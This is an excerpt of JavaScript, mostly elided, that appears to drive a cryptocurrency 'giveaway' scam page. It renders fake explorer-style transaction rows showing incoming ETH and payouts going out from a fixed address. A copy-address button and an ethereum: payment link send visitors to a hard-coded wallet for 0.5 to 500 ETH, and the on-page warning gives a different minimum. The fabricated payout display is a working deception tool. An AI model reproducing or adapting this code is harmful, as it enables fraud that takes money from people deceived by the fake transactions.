...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xe6c43F77F6112638060C9BE79fc43A29b0e51f33</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0xe6c43F77F6112638060C9BE79fc43A29b0e51f33</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a>4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0xe6c43F77F6112638060C9BE79fc43A29b0e51f33</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
        address +
        '</a> </td> <td>' +
        send_amount +
        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 0.5 && $('#cal-in').val() <= 500) {
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'ethereum:0xA90950a5A27E55bD4cd05dC2924E83A122524C93'
        )
    } else $('#warn').text('Amount should be within 0.25 ETH to 500 ETH')
  }),
  $('#close').click(() => {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    '0xe6c43F77F6112638060C9BE79fc43A29b0e51f33',
  )
